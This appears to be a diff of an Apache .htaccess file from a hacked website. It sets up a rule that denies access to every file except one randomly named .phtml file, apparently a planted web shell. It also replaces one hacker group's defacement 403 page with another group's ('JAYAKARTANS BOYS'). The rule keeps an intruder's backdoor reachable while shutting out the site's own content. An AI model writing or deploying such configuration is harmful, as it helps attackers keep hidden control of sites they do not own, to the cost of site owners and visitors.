@@ -5,8 +5,8 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^()$">
+<FilesMatch "^(68bc8ee0d2bac.phtml)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
-ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjB8hg2IR2-8cMsoqNjVH9_tavu_0fKziKC77AI9MDS1Onxahqci9iADGzwB6F9pcuK02g_HbPjalDh7hFmm0KFshCMjB-_qEIsWqr_hLKFKEh-fGvW25gRfkg5g9sk9cZMtdkNwU62odP5TTqtojxBCUbadyptrfB2tZLOChVAmuwcVIo2hgb1T7Z26_lO/s400/d694ec1ef5c440e08cd79022cf7eaa8a.gif"></img> <h3>Error 404: Skill not found. We see you 👁️</font><br><h2>by THE GRIM REAPER</h2>'
+ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUw6j46xUeRKWVeDvnYFBot56A7JyKVt75TCugIkpFWG1R2eNb38nXQ3C5xjtVuEfhYhEjFtXn6L9K2_OXtE-yI0EzZ6ixsCfUr-z36ml-66OyrT-fwa77obE-EA6O-9bA45lTeYuBbL3Vc2I4ZQ2wh1lFwQlqp0JwsfUXQdEi6sXd_6z0S11XjnP-Bgc/s600/download.gif"></img> <h3>Error 404: Skill not found.</font><br><h2>JAYAKARTANS BOYS</h2>'
